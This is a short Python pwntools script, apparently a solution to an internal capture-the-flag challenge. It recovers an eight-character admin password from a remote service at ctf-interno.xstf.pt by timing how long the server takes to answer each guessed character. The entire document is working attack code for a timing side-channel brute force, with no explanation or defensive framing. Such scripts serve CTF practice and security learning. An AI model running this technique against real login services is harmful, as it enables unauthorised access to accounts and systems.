from pwn import *
import string
import time

charset = string.digits + string.ascii_letters
print(charset)

password = ''
for i in range(8):
    for char in charset:
        conn = remote('ctf-interno.xstf.pt', 3001)
        conn.send(b'admin\n')
        conn.send(bytes(f'{password}{char}\n', 'utf-8'))
        start_time = time.time()
        try:
            conn.recvline()
            conn.recvline()
        except EOFError:
            conn.close()
        if (time.time() - start_time) > (i + 1):
            conn.close()
            password += char
            break
        conn.close()
print(f'Password hash: {password}')